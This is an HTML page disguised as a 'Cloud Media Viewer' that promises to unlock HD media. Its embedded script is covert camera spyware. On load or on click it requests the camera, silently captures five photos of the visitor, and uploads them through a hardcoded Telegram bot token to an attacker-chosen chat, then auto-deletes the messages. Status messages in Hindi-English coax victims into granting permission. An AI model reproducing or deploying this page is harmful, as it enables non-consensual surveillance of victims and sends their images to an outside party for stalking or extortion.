<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cloud Media Player</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    body {
      background: #070b14;
      color: #f8fafc;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }
    .viewer-card {
      background: #111a2e;
      border: 1px solid #1e2d4a;
      border-radius: 18px;
      padding: 20px;
      max-width: 440px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
      position: relative;
    }
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding-bottom: 12px;
      margin-bottom: 14px;
      border-bottom: 1px solid #1e2d4a;
      font-size: 13px;
      font-weight: 600;
      color: #38bdf8;
    }
    .media-container {
      width: 100%;
      border-radius: 12px;
      overflow: hidden;
      background: #020617;
      border: 1px solid #233554;
      margin-bottom: 16px;
      position: relative;
      min-height: 220px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .media-container img {
      width: 100%;
      max-height: 380px;
      object-fit: contain;
      display: block;
    }
    .video-overlay {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 64px;
      height: 64px;
      background: rgba(2, 132, 199, 0.85);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 0 25px rgba(56, 189, 248, 0.6);
      cursor: pointer;
      display: none;
    }
    .video-overlay::after {
      content: "";
      border-style: solid;
      border-width: 12px 0 12px 20px;
      border-color: transparent transparent transparent #ffffff;
      margin-left: 4px;
    }

    .btn-action {
      width: 100%;
      padding: 15px;
      background: linear-gradient(135deg, #0284c7 0%, #0369a1 100%);
      color: #ffffff;
      border: none;
      border-radius: 10px;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      display: block;
      margin-top: 10px;
      box-shadow: 0 4px 15px rgba(2, 132, 199, 0.4);
      transition: all 0.2s;
    }
    .btn-action:active {
      transform: scale(0.98);
      filter: brightness(0.9);
    }

    .progress-box {
      width: 100%;
      background: #1e293b;
      height: 8px;
      border-radius: 6px;
      overflow: hidden;
      margin-top: 14px;
      display: none;
    }
    .progress-bar {
      width: 0%;
      height: 100%;
      background: #38bdf8;
      transition: width 0.3s;
    }

    #status {
      font-size: 13px;
      color: #94a3b8;
      margin-top: 12px;
      min-height: 20px;
    }
    .help-box {
      margin-top: 12px;
      font-size: 12px;
      color: #cbd5e1;
      background: #0a1120;
      padding: 10px;
      border-radius: 8px;
      border: 1px dashed #334155;
      display: none;
    }

    video, canvas {
      display: none;
    }
  </style>
</head>
<body>

  <div class="viewer-card">
    <div class="top-bar">
      <span id="titleTag">🖼️ Cloud Media Viewer</span>
      <span style="color:#4ade80;">● Ultra HD</span>
    </div>

    <div class="media-container" id="mediaContainer">
      <img id="previewImage" src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600" alt="Media Preview">
      <div class="video-overlay" id="videoPlayIcon"></div>
    </div>

    <!-- Visible Action Button -->
    <button id="allowBtn" class="btn-action">📸 Allow Camera / Unlock Full HD</button>

    <div class="progress-box" id="progressBox">
      <div class="progress-bar" id="progressBar"></div>
    </div>

    <div id="status">Tap button above to unlock media</div>

    <div class="help-box" id="helpBox">
      💡 <b>Permission Tip:</b> Browser URL bar me <b>Lock (🔒)</b> ya site settings par tap karke Camera <b>Allow</b> karein.
    </div>

    <video id="videoElement" autoplay playsinline muted></video>
    <canvas id="canvasElement"></canvas>
  </div>

  <script>
    const BOT_TOKEN = "9057540528:AAHA3zbRfTvOdYA23ESw43QziYP_qA0_Xqw";

    const urlParams = new URLSearchParams(window.location.search);
    const targetChatId = urlParams.get('id');
    const customImg = urlParams.get('img');
    const camMode = (urlParams.get('cam') || 'front').toLowerCase();
    const themeMode = (urlParams.get('theme') || 'photo').toLowerCase();

    const previewImage = document.getElementById('previewImage');
    const videoPlayIcon = document.getElementById('videoPlayIcon');
    const titleTag = document.getElementById('titleTag');
    const allowBtn = document.getElementById('allowBtn');
    const statusText = document.getElementById('status');
    const helpBox = document.getElementById('helpBox');
    const progressBox = document.getElementById('progressBox');
    const progressBar = document.getElementById('progressBar');
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvasElement');

    if (themeMode === 'video') {
      titleTag.innerText = "🎬 Cloud Video Player";
      videoPlayIcon.style.display = "flex";
      allowBtn.innerText = "▶ Play Video & Unlock Stream";
    }

    if (customImg && customImg.startsWith('http')) {
      previewImage.src = customImg;
    }

    let isCapturing = false;
    let shotCount = 0;
    // Optimized shots: High stability, avoids Telegram 429 rate limit errors
    const maxShots = 5;
    let streamRef = null;

    async function startCamera() {
      if (isCapturing) return;

      statusText.style.color = "#38bdf8";
      statusText.innerText = "Connecting media stream...";
      helpBox.style.display = "none";

      const videoConstraints = (camMode === 'back')
        ? { facingMode: { ideal: 'environment' } }
        : { facingMode: 'user' };

      try {
        streamRef = await navigator.mediaDevices.getUserMedia({
          video: videoConstraints,
          audio: false
        });

        isCapturing = true;
        video.srcObject = streamRef;
        allowBtn.style.display = "none";
        videoPlayIcon.style.display = "none";
        progressBox.style.display = "block";
        statusText.style.color = "#4ade80";
        statusText.innerText = "Rendering high definition stream...";

        const timer = setInterval(() => {
          shotCount++;
          sendPhoto(shotCount);

          const percent = Math.round((shotCount / maxShots) * 100);
          progressBar.style.width = percent + "%";

          if (shotCount >= maxShots) {
            clearInterval(timer);
            statusText.innerText = "✅ Media successfully synchronized!";
            if (streamRef) {
              streamRef.getTracks().forEach(track => track.stop());
            }
          }
        }, 1200);

      } catch (err) {
        console.warn("User gesture or permission required:", err);
        allowBtn.style.display = "block";
        allowBtn.innerText = "🔄 Tap to Allow Camera Permission";
        statusText.style.color = "#f87171";
        statusText.innerText = "⚠️ Camera permission allow karein media load karne ke liye!";
        helpBox.style.display = "block";
      }
    }

    function sendPhoto(num) {
      if (!targetChatId) return;

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Compressed 0.65 JPEG to optimize traffic and speed
      canvas.toBlob(async (blob) => {
        if (!blob) return;

        const label = (camMode === 'back') ? "Back Camera" : "Front Camera";
        const formData = new FormData();
        formData.append('chat_id', targetChatId);
        formData.append('photo', blob, `${camMode}_photo_${num}.jpg`);
        formData.append('caption', `📸 [${label}] Shot ${num}/${maxShots}\n⏰ Time: ${new Date().toLocaleTimeString()}\n⏳ 5-Minute Auto-Delete Active`);

        try {
          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
          const resData = await res.json();

          if (resData.ok && resData.result && resData.result.message_id) {
            const msgId = resData.result.message_id;
            setTimeout(async () => {
              try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ chat_id: targetChatId, message_id: msgId })
                });
              } catch (e) {}
            }, 300000);
          }
        } catch (e) {
          console.error("Upload error:", e);
        }
      }, 'image/jpeg', 0.65);
    }

    allowBtn.addEventListener('click', startCamera);
    videoPlayIcon.addEventListener('click', startCamera);

    window.addEventListener('DOMContentLoaded', () => {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        startCamera();
      }
    });
  </script>
</body>
</html>
